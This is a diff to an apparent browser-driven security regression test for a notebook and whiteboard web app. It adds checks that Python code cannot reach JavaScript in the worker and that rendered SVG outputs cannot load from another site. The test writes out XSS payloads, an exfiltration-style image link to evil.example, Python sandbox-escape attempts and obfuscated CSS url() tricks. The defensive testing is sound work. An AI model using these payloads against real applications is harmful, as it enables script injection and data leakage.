@@ -17,10 +17,11 @@ let targets;
 for (let i = 0; i < 300; i++) { try { targets = await (await fetch(`http://127.0.0.1:${port}/json`)).json(); break; } catch { await sleep(100); } }
 const ws = new WebSocket(targets.find((t) => t.type === "page").webSocketDebuggerUrl);
 await new Promise((r) => (ws.onopen = r));
-let n = 0; const waiting = new Map(); const dialogs = [];
+let n = 0; const waiting = new Map(); const dialogs = [], probes = [];
 ws.onmessage = (ev) => {
   const m = JSON.parse(ev.data);
   if (m.id && waiting.has(m.id)) { waiting.get(m.id)(m.result ?? m.error); waiting.delete(m.id); }
+  if (m.method === "Network.requestWillBeSent" && /sb-probe/.test(m.params.request.url)) probes.push(m.params.request.url);
   if (m.method === "Page.javascriptDialogOpening") { dialogs.push(m.params.message); send("Page.handleJavaScriptDialog", { accept: true }); }
 };
 const send = (method, params = {}) => new Promise((r) => { const id = ++n; waiting.set(id, r); ws.send(JSON.stringify({ id, method, params })); });
@@ -35,6 +36,10 @@ const hostile = {
     { id: "a", title: X("a-title"), text: X("a-text") + " <a href='javascript:window.__xss.push(1)'>x</a>", detail: X("a-detail"), ref: "javascript:window.__xss.push('ref')", color: "red;background:url(javascript:window.__xss.push('css'))", shape: "rect\" onmouseover=\"window.__xss.push('shape')", x: "1\"><img src=x onerror=\"window.__xss.push('x')\">", y: 0 },
     { id: "g", kind: "group", title: X("g"), text: X("g-text"), color: "url(javascript:1)", x: "0\"/><image href=x onerror=\"window.__xss.push('gx')\"/><rect x=\"0", y: 300, children: [{ id: "b", text: "**fine** <span style=\"color:green\">green</span>", w: "300\"><img src=x onerror=\"window.__xss.push('w')\">" }] },
     { id: "c", kind: "code", code: "print('<img src=x onerror=1>')\nfrom IPython.display import HTML, Markdown, display\ndisplay(HTML('<b>bold</b><img src=x onerror=\"window.__xss.push(\\'html\\')\"><script>window.__xss.push(\\'htmls\\')</script>'))\ndisplay(Markdown('![leak](https://evil.example/?data=secret) <img src=x onerror=\"window.__xss.push(\\'md\\')\">'))" },
+    // Python reaching JavaScript in the worker (sagebrush-daybreak's SEC-983-1 and -2): each would tell the page
+  ...[["e1", `class L(list):\n    pass\ndef ctor(o):\n    return o.constructor\na = L()\na.constructor = None\nctor(a)\nb = L()\nArray = ctor(b)\nsetattr(b, "__proto__", Array)\nctor(b)("new BroadcastChannel('sbx').postMessage('proto')")()`],
+      ["e2", `import os, sys\nd = "/sbx\\nnew BroadcastChannel('sbx').postMessage('sourceurl');true?(()=>{}):0"\nos.makedirs(d, exist_ok=True)\nwith open(d + "/sbxm.py", "w") as f:\n    f.write("x = 1\\n")\nsys.path.insert(0, d)\nimport sbxm\nprint("imported", sbxm.x)`]]
+    .map(([id, code], i) => ({ id, kind: "code", code, x: 900 + 400 * i, y: 600 })),
   ],
   edges: [{ from: "a", to: "b", label: X("edge") }, { from: "b", to: "c", label: "</text><script>window.__xss.push('svg')</script>" }],
   steps: [{ focus: "a", say: X("step") }],
@@ -42,7 +47,7 @@ const hostile = {
 };
 try {
   for (const m of ["Page.enable", "Runtime.enable"]) await send(m);
-  await send("Page.addScriptToEvaluateOnNewDocument", { source: "window.__xss = [];" });
+  await send("Page.addScriptToEvaluateOnNewDocument", { source: "window.__xss = []; window.__sbx = []; new BroadcastChannel('sbx').onmessage = (e) => window.__sbx.push(e.data);" });
   await send("Page.navigate", { url: `${base}board/?mermaid=${encodeURIComponent("flowchart LR\n a --> b")}` });
   for (let i = 0; i < 300 && !(await ev("!!window.sagebrush?.board?.snapshot().items.length").catch(() => false)); i++) await sleep(100);
   await ev(`window.sagebrush.board.load(${JSON.stringify(hostile)})`);
@@ -50,7 +55,11 @@ try {
   await ev("window.board.focus(undefined, true)");
   await sleep(800);
   // (code ran: its outputs shown in their item)
-  for (let i = 0; i < 200 && !(await ev("window.sagebrush.board.outputs().then((o) => o.some((x) => x.id === 'c' && x.state === '' && x.output))")); i++) await sleep(100);
+  for (let i = 0; i < 200 && !(await ev("window.sagebrush.board.outputs().then((o) => ['c', 'e1', 'e2'].every((id) => o.some((x) => x.id === id && x.state === '' && x.output)))")); i++) await sleep(100);
+  const outs = await ev("window.sagebrush.board.outputs()");
+  check(/AttributeError/.test(outs.find((x) => x.id === "e1")?.output ?? ""), `SEC-983-1: the inherited constructor is no attribute: ${JSON.stringify(outs.find((x) => x.id === "e1"))}`.slice(0, 300));
+  check(/imported 1/.test(outs.find((x) => x.id === "e2")?.output ?? ""), `SEC-983-2: the module imports: ${JSON.stringify(outs.find((x) => x.id === "e2"))}`.slice(0, 300));
+  check((await ev("window.__sbx")).length === 0, `Python ran JavaScript in the worker: ${JSON.stringify(await ev("window.__sbx"))}`);
   await ev("window.board.focus(['c'], true)");
   await sleep(800);
   await ev("window.sagebrush.board.editing(true)");
@@ -80,6 +89,29 @@ try {
   const d = await ev("window.sagebrush.board.snapshot().doc");
   check(d.nodes[0].x === undefined && d.nodes[0].color === undefined && d.nodes[0].shape === undefined, `hostile fields kept: ${JSON.stringify({ x: d.nodes[0].x, color: d.nodes[0].color, shape: d.nodes[0].shape })}`);
   check(await ev("document.querySelectorAll('.board-item span[style]').length") >= 1, "the safe formatting (a colored span) is kept");
+  // outputs that would load from another site (SEC-983-3, -4, -5): none may make a request
+  await send("Network.enable");
+  await send("Page.navigate", { url: base });
+  for (let i = 0; i < 400 && !(await ev("!!window.sagebrush?.notebook?.output").catch(() => false)); i++) await sleep(100);
+  const probe = (k) => `http://127.0.0.1:9/sb-probe-${k}`;
+  const bundles = [
+    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="fill:u\\72 l(${probe("style")})"/></svg>` },
+    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="u\\72 l(${probe("fill")})"/></svg>` },
+    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="fill:u/**/rl(${probe("comment")});background-image:image-set('${probe("imageset")}' 1x)"/></svg>` },
+    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/1999/xlink"><use x:href="${probe("xlink")}#x"/><image x:href="${probe("ximage")}" width="5" height="5"/><g xml:base="${probe("base")}/"><use href="other.svg#x"/></g></svg>` },
+    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" xmlns:q="http://www.w3.org/1999/xlink"><defs><linearGradient id="g"/></defs><rect width="9" height="9" fill="url(#g)" mask="url('${probe("mask")}')"/><use q:href="#g"/></svg>` },
+    { "image/svg+xml": "<svg xmlns='http://www.w3.org/2000/svg' width='20' height='20'/>", "application/vnd.sagebrush.scene3d+json": JSON.stringify({ lo: [0, 0, 0], hi: [1, 1, 1], scale: [1, 1, 1], frame: false,
+      objects: [{ type: "text2", mode: "2d", position: [0.5, 0.5], text: "probe", size: 1, color: `red;background-image:url(${probe("scene")})` }] }) },
+  ];
+  const kept = await ev(`(async () => {
+    const box = document.body.appendChild(document.createElement("div"));
+    for (const b of ${JSON.stringify(bundles)}) window.sagebrush.notebook.output.display(box, b);
+    await new Promise((r) => setTimeout(r, 2500));
+    return { refs: box.querySelectorAll("[fill^='url(#s'], use[href^='#s']").length, labels: [...box.querySelectorAll("span")].filter((s) => s.textContent === "probe").map((s) => s.style.color) };
+  })()`);
+  await sleep(500);
+  check(probes.length === 0, `outputs loaded from another site: ${probes.join(", ")}`);
+  check(kept.refs >= 1, `a picture's own references (url(#id), #id) are kept: ${JSON.stringify(kept)}`);
   // the site's own pages run under their Content-Security-Policy without a single violation
   for (const [path, ready] of [["", "window.sagebrush?.kernel?.ready"], ["board/?doc=examples%2Flive.json", "window.sagebrush?.board?.outputs?.().then((o) => o.length && o.every((x) => x.state === '' ))"], ["embed/", "document.querySelectorAll('.sbnb .cell').length > 0"]]) {
     await send("Page.addScriptToEvaluateOnNewDocument", { source: "window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI));" });
